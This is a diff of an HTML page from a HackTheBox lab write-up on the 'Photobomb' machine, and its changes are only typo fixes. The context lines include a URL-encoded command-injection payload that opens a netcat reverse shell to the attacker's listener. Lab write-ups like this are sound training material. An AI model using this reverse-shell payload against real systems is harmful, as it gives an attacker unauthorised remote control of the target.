@@ -141,7 +141,7 @@
         <img class="box-icon" src="/hack/images/photobomb.png"></img>
         <p><i>Compromised on February 7, 2023</br>Written on February 4, 2024</i></p>
         <p>Photobomb is my fifth machine to compromise on HackTheBox. This Linux machine features hardcoded credentials in a .js file, 
-            Command Injection vulnerability for a low-privileged user, and a script that uses a binary without specifying it's absolute path.
+            Command Injection vulnerability for a low-privileged user, and a script that uses a binary without specifying its absolute path.
         </p>
         <h2>Enumeration</h2>
         <h3>Nmap</h3>
@@ -186,7 +186,7 @@
         <p>Then we'll execute a command on the target machine to send a reverse shell to our listener.</p>
         <pre><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.3%204444%20%3E%2Ftmp%2Ff</code></pre>
         <img src="../images/photobomb14.png">
-        <p>We have a reverse shell on the target machine as user "wizard"</p>
+        <p>We have a reverse shell on the target machine as user "wizard".</p>
         <img src="../images/photobomb15.png">
         <p>We got the user flag.</p>
         <pre><code>cd</br>cat user.txt</code></pre>
